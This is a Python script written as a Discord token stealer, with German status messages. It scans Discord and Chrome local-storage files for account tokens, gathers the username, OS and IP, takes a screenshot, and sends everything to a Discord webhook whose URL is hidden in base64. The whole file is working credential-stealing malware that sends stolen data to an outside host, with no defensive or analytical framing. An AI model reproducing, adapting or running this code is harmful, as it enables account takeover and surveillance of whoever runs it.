import os
import json
import requests
import socket
import getpass
import platform
import base64
import re
from io import BytesIO
from PIL import ImageGrab

encoded_webhook_url = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4OTkxODA4MzU2MDM3NDM4Mi9XMkw3R1F4WG1WVXBzVDR0ZU4ybThRZ3RvMEx6cmhNTFhfMk1zTUNVNlItdGlnTllSdElSQ3k3T2dwbmVsR3dyYUJSNg=="

def get_webhook_url():
    if not encoded_webhook_url:
        return ""
    decoded_bytes = base64.b64decode(encoded_webhook_url)
    return decoded_bytes.decode('utf-8')

def get_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return ip
    except:
        return "IP nicht gefunden"

def get_user():
    return getpass.getuser()

def get_os_info():
    return platform.platform()

def steal_discord_tokens():
    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}")
    paths = [
        os.path.expandvars(r"%APPDATA%\discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordcanary\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\discordptb\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
    ]
    tokens = []
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith(".log") and not file.endswith(".ldb"):
                continue
            try:
                with open(os.path.join(path, file), errors='ignore') as f:
                    content = f.read()
                    found_tokens = token_regex.findall(content)
                    tokens.extend(found_tokens)
            except:
                pass
    return list(set(tokens))

def take_screenshot():
    try:
        screenshot = ImageGrab.grab()
        buffer = BytesIO()
        screenshot.save(buffer, format="PNG")
        buffer.seek(0)
        return buffer
    except Exception as e:
        print(f"Screenshot Fehler: {e}")
        return None

def build_payload_dict():
    return {
        "user": get_user(),
        "os": get_os_info(),
        "ip": get_ip(),
        "discord_tokens": steal_discord_tokens()
    }

def send_webhook(payload_dict):
    url = get_webhook_url()
    if not url:
        print("Kein Webhook definiert. Payload wird nicht gesendet.\n")
        print(json.dumps(payload_dict, indent=4))
        return

    embed = {
        "title": "data Grabbed",
        "color": 0xff0000,
        "fields": []
    }

    for key, value in payload_dict.items():
        if isinstance(value, list):
            value = "\n".join(value) if value else "Keine Daten"
        if len(value) > 900:
            value = value[:900] + "..."
        embed["fields"].append({
            "name": key.capitalize(),
            "value": str(value),
            "inline": False
        })

    data = {
        "embeds": [embed]
    }

    headers = {"Content-Type": "application/json"}

    screenshot_buffer = take_screenshot()
    files = None
    if screenshot_buffer:
        files = {
            "file": ("screenshot.png", screenshot_buffer, "image/png")
        }
        # multipart/form-data with file and json payload
        try:
            response = requests.post(url, data={"payload_json": json.dumps(data)}, files=files)
            if response.status_code == 204:
                print("Payload mit Screenshot erfolgreich gesendet.")
            else:
                print(f"Fehler beim Senden: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Exception beim Senden: {e}")
    else:
        # fallback ohne Bild
        try:
            response = requests.post(url, json=data, headers=headers)
            if response.status_code == 204:
                print("Payload erfolgreich gesendet.")
            else:
                print(f"Fehler beim Senden: {response.status_code} - {response.text}")
        except Exception as e:
            print(f"Exception beim Senden: {e}")

if __name__ == "__main__":
    payload = build_payload_dict()
    send_webhook(payload)
